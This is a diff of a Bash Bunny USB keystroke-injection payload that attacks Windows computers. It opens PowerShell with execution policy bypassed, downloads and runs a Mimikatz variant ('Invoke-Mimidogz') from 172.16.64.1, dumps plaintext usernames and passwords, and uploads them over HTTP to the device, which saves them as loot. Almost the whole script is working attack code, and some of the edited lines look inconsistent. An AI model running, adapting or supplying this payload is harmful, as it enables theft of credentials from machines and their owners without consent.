@@ -7,10 +7,10 @@
 # Dumps the usernames & plaintext passwords from Windows boxes using Powershell in memory
 # with Mimikatz then stashes them in /root/udisk/loot/MrRobot
 #
-# Blue...............Starting WebServer
-# Purple.............Running Powershell
+# Amber..............Starting WebServer
+# Blue...............Running Powershell
 # Green..............Got Creds
-# Red................Didn't Get Creds
+# Red................No Creds
 
 source bunny_helpers.sh
 
@@ -20,33 +20,51 @@ mkdir -p $LOOTDIR
 SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
 mkdir -p $SWITCHDIR/loot
 
-iptables -A OUTPUT -p udp --dport 53 -j DROP
-python $SWITCHDIR/server.py &
-while ! nc -z $HOST_IP 80; do sleep 0.2; done
-ATTACKMODE RNDIS_ETHERNET
 
 # HID Attack Starts and nand drive is unmounted
 ATTACKMODE HID
 LED B 200
-Q 
+
 Q DELAY 1000
 Q GUI r
 Q DELAY 300
-Q CMD
+Q STRING CMD
 Q ENTER
 Q DELAY 1000
-Q STRING powershell -NoP -Exec Bypass -c \"IEX \(New-Object Net.WebClient\).DownloadString\(\'http\:\/\/\$HOST_IP\/md.ps1\'\)\;
-Q STRING \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/\$env:computername\'\, \$o\)\;
-Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/\EOF\'\, \'EOF\'\)\"
+Q STRING powershell -NoP -Exec Bypass -c \"while \(\$true\) \{ If \(Test-Connection 172.16.64.1 -count 1 -quiet\) \{ sleep 2\; exit\"\}\} 
+Q DELAY 300
+Q ENTER
+Q STRING powershell -NoP -Exec Bypass -c \"sleep 5\;IEX \(New-Object Net.WebClient\).DownloadString\(\'http\:\/\/\172.16.64.1\/md.ps1\'\)\;
+Q STRING \$o \= Invoke-Mimidogz -DumpCred\; 
+Q DELAY 300
+Q ENTER
+Q DELAY 5000
+Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/\'\+\$env:computername\, \$o\)\;
+Q DELAY 300
 Q ENTER
 
-mount -o sync /dev/nandf /root/udisk
+ATTACKMODE RNDIS_ETHERNET
 
+source bunny_helpers.sh
+
+LED R G B 200
+LOOTDIR=/root/udisk/loot/MrRobot
+SWITCHDIR=/root/udisk/payloads/switch2
+
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python $SWITCHDIR/server.py
+while ! nc -z $HOST_IP 80; do sleep 0.2; done
+
+sleep 15
+
+#Copy loot to the loot folder
+mount -o sync /dev/nandf /root/udisk
 # look for empty dir 
 if [ "$(ls -A $SWITCHDIR/loot)" ]; then
      mv -v $SWITCHDIR/loot/*.txt $LOOTDIR 
      rmdir $SWITCHDIR/loot/
      LED G
 else
-    LED R
+     rmdir $SWITCHDIR/loot/
+     LED R
 fi
